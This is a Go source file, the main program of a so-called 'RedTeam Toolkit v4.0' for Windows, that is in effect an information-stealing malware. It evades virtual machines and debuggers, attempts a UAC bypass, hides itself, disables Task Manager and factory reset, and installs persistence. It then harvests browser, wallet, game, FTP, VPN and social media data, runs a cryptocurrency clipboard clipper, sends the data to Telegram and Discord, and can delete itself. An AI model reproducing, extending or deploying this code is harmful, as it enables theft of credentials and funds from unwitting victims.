// ============================================================
// main.go - RedTeam Toolkit v4.0 (Windows) - COMPLETE
// ============================================================
package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"time"

	"github.com/RU7HL355/redtm/internal/antidebug"
	"github.com/RU7HL355/redtm/internal/antivm"
	"github.com/RU7HL355/redtm/internal/antivirus"
	"github.com/RU7HL355/redtm/internal/core/browsers"
	"github.com/RU7HL355/redtm/internal/core/clipper"
	"github.com/RU7HL355/redtm/internal/core/commonfiles"
	"github.com/RU7HL355/redtm/internal/core/cryptowallets"
	"github.com/RU7HL355/redtm/internal/core/exfil"
	"github.com/RU7HL355/redtm/internal/core/ftps"
	"github.com/RU7HL355/redtm/internal/core/games"
	"github.com/RU7HL355/redtm/internal/core/socials"
	"github.com/RU7HL355/redtm/internal/core/system"
	"github.com/RU7HL355/redtm/internal/core/vpn"
	"github.com/RU7HL355/redtm/internal/fakerr"
	factoryreset "github.com/RU7HL355/redtm/internal/fr"
	hideconsole "github.com/RU7HL355/redtm/internal/hc"
	"github.com/RU7HL355/redtm/internal/taskmanager"
	"github.com/RU7HL355/redtm/internal/uac"
	"github.com/RU7HL355/redtm/pkg/utils/common"
	"github.com/RU7HL355/redtm/pkg/utils/processkill"
	"github.com/RU7HL355/redtm/pkg/utils/startup"
)

// Config struct for configuration
type Config struct {
	BotToken     string            `json:"botToken"`
	ChatID       string            `json:"chatId"`
	Discord      string            `json:"discordWebhook,omitempty"`
	Cryptos      map[string]string `json:"cryptos"`
	Enabled      bool              `json:"enabled"`
	Debug        bool              `json:"debug"`
	SelfDestruct bool              `json:"selfDestruct"`
}

var config Config
var startTime time.Time

func main() {
	startTime = time.Now()
	
	// Initialize logging
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	log.Println("🚀 RedTeam Toolkit v4.0 (Windows) starting...")
	log.Println("========================================")
	
	// Load configuration
	if !loadConfig() {
		log.Println("⚠️ No config found, using defaults")
		config = getDefaultConfig()
	} else {
		log.Println("✅ Config loaded successfully")
	}

	// Initialize exfil module FIRST
	log.Println("📤 Initializing exfil module...")
	exfil.Init(config.BotToken, config.ChatID, config.Discord)

	// Send startup messages
	log.Println("📤 Sending startup notifications...")
	
	// Test Telegram
	log.Println("📤 Sending Telegram test message...")
	if exfil.SendTelegram("✅ RedTeam Toolkit v4.0 (Windows) is running!") {
		log.Println("✅ Telegram test message sent successfully!")
	} else {
		log.Println("❌ Telegram test message failed! Check your bot token and chat ID.")
		if len(config.BotToken) > 10 {
			log.Printf("   Token: %s...", config.BotToken[:10])
		} else {
			log.Printf("   Token: %s", config.BotToken)
		}
		log.Printf("   Chat ID: %s", config.ChatID)
	}

	// Test Discord
	log.Println("📤 Sending Discord test message...")
	if exfil.SendDiscord("✅ RedTeam Toolkit v4.0 (Windows) is running!") {
		log.Println("✅ Discord test message sent successfully!")
	} else {
		log.Println("❌ Discord test message failed!")
		if len(config.Discord) > 30 {
			log.Printf("   Webhook: %s...", config.Discord[:30])
		} else {
			log.Printf("   Webhook: %s", config.Discord)
		}
	}

	// Send system info
	sendSystemInfo()

	// Check if already running
	if common.IsAlreadyRunning() {
		log.Println("⚠️ Already running, exiting...")
		return
	}

	// Anti-analysis checks
	log.Println("🔍 Running anti-analysis checks...")

	if antivm.IsVM() {
		log.Println("⚠️ VM detected - exiting")
		exfil.SendHeartbeat("⚠️ VM detected - exiting")
		return
	}

	if antidebug.IsDebugged() {
		log.Println("⚠️ Debugger detected - exiting")
		exfil.SendHeartbeat("⚠️ Debugger detected - exiting")
		return
	}
	
	log.Println("✅ Anti-analysis checks passed")

	// Privilege escalation
	log.Println("🔐 Attempting UAC bypass...")
	uac.Run()

	// Kill competitor processes
	log.Println("💀 Killing competitor processes...")
	processkill.Run()

	// Stealth operations
	log.Println("🕵️ Applying stealth...")
	hideconsole.HideConsole()
	common.HideSelf()
	factoryreset.Disable()
	taskmanager.Disable()

	// Persistence
	if !common.IsInStartupPath() {
		log.Println("💾 Installing persistence...")
		go fakerr.Show()
		go startup.Run()
	}

	// Anti-analysis background tasks
	log.Println("🔒 Starting anti-analysis background tasks...")
	go antidebug.Run()
	go antivirus.Run()

	// Start surveillance
	log.Println("📹 Starting surveillance modules...")

	// Define all extraction actions
	actions := []struct {
		name string
		fn   func()
	}{
		{"System Info", system.Run},
		{"Browsers", browsers.Run},
		{"Common Files", commonfiles.Run},
		{"Crypto Wallets", cryptowallets.Run},
		{"Games", games.Run},
		{"FTP Clients", ftps.Run},
		{"VPN Clients", vpn.Run},
		{"Social Media", socials.Run},
	}

	// Run all actions in parallel
	log.Println("📂 Starting extraction modules...")
	for _, action := range actions {
		log.Printf("📂 Starting: %s", action.name)
		go action.fn()
	}

	// Start clipper in background
	log.Println("💰 Starting crypto clipper...")
	go clipper.Run(config.Cryptos)

	// Wait for modules to complete with progress updates
	log.Println("⏳ Waiting for modules to complete (60 seconds)...")
	exfil.SendHeartbeat("⏳ Starting data extraction...")

	// Progress updates every 10 seconds
	for i := 0; i < 6; i++ {
		time.Sleep(10 * time.Second)
		elapsed := int(time.Since(startTime).Seconds())
		exfil.SendHeartbeat(fmt.Sprintf("⏳ Extraction in progress... %d seconds elapsed", elapsed))
	}

	// Collect and exfil all data
	log.Println("📤 Exfiltrating data...")
	exfil.SendHeartbeat("📤 Collecting and exfiltrating data...")
	exfil.CollectAndSend()

	// Send browser data specifically
	log.Println("📤 Sending browser data...")
	exfil.SendBrowserData()

	// Send wallet data
	log.Println("📤 Sending wallet data...")
	exfil.SendWalletData()

	// Send system info
	log.Println("📤 Sending system info...")
	exfil.SendSystemInfo()

	// Cleanup
	if config.SelfDestruct {
		log.Println("💀 Self-destruct initiated...")
		exfil.SendHeartbeat("💀 Self-destruct initiated")
		time.Sleep(2 * time.Second)
		selfDestruct()
	}

	// Final heartbeat
	exfil.SendHeartbeat("✅ All tasks complete")
	
	// Print summary
	printSummary()

	log.Println("✅ All tasks complete!")

	// Wait for exit
	time.Sleep(5 * time.Second)
}

// loadConfig loads configuration from config.json
func loadConfig() bool {
	data, err := ioutil.ReadFile("config.json")
	if err != nil {
		log.Printf("❌ Failed to read config.json: %v", err)
		return false
	}

	if err := json.Unmarshal(data, &config); err != nil {
		log.Printf("❌ Failed to parse config.json: %v", err)
		return false
	}

	return true
}

// getDefaultConfig returns default configuration
func getDefaultConfig() Config {
	return Config{
		BotToken: "",
		ChatID:   "",
		Discord:  "",
		Cryptos: map[string]string{
			"BTC":  "",
			"BCH":  "",
			"ETH":  "",
			"XMR":  "",
			"LTC":  "",
			"XCH":  "",
			"XLM":  "",
			"TRX":  "",
			"ADA":  "",
			"DASH": "",
			"DOGE": "",
		},
		Enabled:       true,
		Debug:         false,
		SelfDestruct:  false,
	}
}

// sendSystemInfo sends system information
func sendSystemInfo() {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	
	info := fmt.Sprintf("🖥️ System Information\n")
	info += fmt.Sprintf("   Hostname: %s\n", hostname)
	info += fmt.Sprintf("   Username: %s\n", username)
	info += fmt.Sprintf("   OS: %s\n", common.GetOS())
	info += fmt.Sprintf("   Admin: %v\n", common.IsAdmin())
	info += fmt.Sprintf("   Time: %s", time.Now().Format("2006-01-02 15:04:05"))
	
	exfil.SendHeartbeat(info)
}

// printSummary prints a summary of the run
func printSummary() {
	elapsed := int(time.Since(startTime).Seconds())
	
	log.Println("========================================")
	log.Println("📊 SUMMARY")
	log.Println("========================================")
	log.Printf("   Duration: %d seconds", elapsed)
	log.Printf("   Config: %s", getConfigStatus())
	log.Printf("   Telegram: %s", getTelegramStatus())
	log.Printf("   Discord: %s", getDiscordStatus())
	log.Println("========================================")
}

// getConfigStatus returns the config status
func getConfigStatus() string {
	if config.BotToken != "" && config.ChatID != "" {
		return "✅ Configured"
	}
	return "❌ Not Configured"
}

// getTelegramStatus returns the Telegram status
func getTelegramStatus() string {
	if config.BotToken != "" {
		return "✅ Enabled"
	}
	return "❌ Disabled"
}

// getDiscordStatus returns the Discord status
func getDiscordStatus() string {
	if config.Discord != "" {
		return "✅ Enabled"
	}
	return "❌ Disabled"
}

// selfDestruct removes all traces
func selfDestruct() {
	log.Println("🧹 Cleaning up...")

	// Delete log files
	os.Remove("redteam.log")
	os.Remove("telemetry.log")

	// Delete JSON data files
	files := []string{
		"browser_data.json",
		"system_info.json",
		"wallets.json",
		"games.json",
		"socials.json",
		"common_files.json",
		"ftps.json",
		"vpns.json",
	}
	
	for _, file := range files {
		os.Remove(file)
	}

	// Delete executable (Windows)
	if common.IsWindows() {
		cmd := "timeout /t 2 /nobreak > nul & del " + os.Args[0]
		os.StartProcess("cmd", []string{"/c", cmd}, nil)
	}
}